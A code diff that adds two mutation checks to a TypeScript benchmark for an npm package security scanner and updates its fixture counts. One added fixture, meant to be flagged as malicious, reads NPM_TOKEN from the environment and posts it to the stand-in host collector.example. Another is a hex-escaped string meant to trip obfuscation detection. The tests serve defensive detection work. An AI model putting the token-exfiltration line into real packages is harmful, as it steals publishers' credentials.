@@ -4,10 +4,10 @@
  *
  * Implements NVIDIA Auto-Ontology's BENCHMARK.md rigor + REA `rea-analysis-optimization`
  * & `rea-ci-tests-audit` discipline:
- * - Executes a real 45-fixture security corpus (19 benign CLIs + 26 adversarial/fail-closed attacks)
+ * - Executes a real 49-fixture security corpus (21 benign CLIs + 28 adversarial/fail-closed attacks)
  *   measuring real Recall, False Positive Rate, p50/p95 latency, and Peak RSS memory.
  * - Executes a real Git history cold vs. warm Split-Plane SQLite cache benchmark.
- * - Executes 16 real perturbation/mutation checks proving assertions fail red on regressions.
+ * - Executes 18 real perturbation/mutation checks proving assertions fail red on regressions.
  * - Verifies `BENCHMARK.md` dataset digest freshness in `--check` mode.
  * - Reports Tier 3 Live Multi-Agent Sandbox Uplift honestly as NOT RUN (N/A) without fabrication.
  */
@@ -419,6 +419,38 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
         nonPurlStatus === "verification_failed" &&
         wrongVerStatus === "verification_failed",
       detail: `asi=${asiClean}->${asiEvil}, nonPurl=${nonPurlStatus}, wrongVer=${wrongVerStatus}`,
+    });
+
+    // Mutation 17: Lexical param shadowing / benign env alias vs unshadowed closure taint capture
+    const scopeClean = await runInspectFixture("mut-scope", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-scope", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const tok = process.env.NPM_TOKEN; var env2 = process.env; const c = env2.NO_COLOR; function send(tok) { fetch("https://registry.npmjs.org", { body: tok + c }); } send("ok");' },
+    ]);
+    const scopeEvil = await runInspectFixture("mut-scope", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-scope", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const tok = process.env.NPM_TOKEN; function send() { fetch("https://collector.example/c", { body: tok }); } send();' },
+    ]);
+    results.push({
+      id: "mut-17-scoped-shadow-vs-closure-taint",
+      passed: scopeClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && scopeEvil === "MALICIOUS_INDICATORS_FOUND",
+      detail: `${scopeClean} -> ${scopeEvil}`,
+    });
+
+    // Mutation 18: Unicode RegExp character-class table (benign) vs dense hex-escaped string payload (obfuscated)
+    const uniRanges = Array.from({ length: 120 }, (_, i) => `\\u${(0x00c0 + i * 4).toString(16).padStart(4, "0")}-\\u${(0x00c0 + i * 4 + 2).toString(16).padStart(4, "0")}`).join("");
+    const uniClean = await runInspectFixture("mut-uni", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-uni", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: `const UNI_RE = /[${uniRanges}]/u; export const check = (s) => UNI_RE.test(s);` },
+    ]);
+    const denseHex = Array.from({ length: 84 }, (_, i) => `\\x${(65 + (i % 26)).toString(16)}`).join("");
+    const uniEvil = await runInspectFixture("mut-uni", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-uni", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: `const p = "${denseHex}"; console.log(p);` },
+    ]);
+    results.push({
+      id: "mut-18-unicode-regex-vs-dense-escape-obfuscation",
+      passed: uniClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && uniEvil === "QUARANTINE_SUSPICIOUS",
+      detail: `${uniClean} -> ${uniEvil}`,
     });
   } finally {
     rmSync(dir, { recursive: true, force: true });
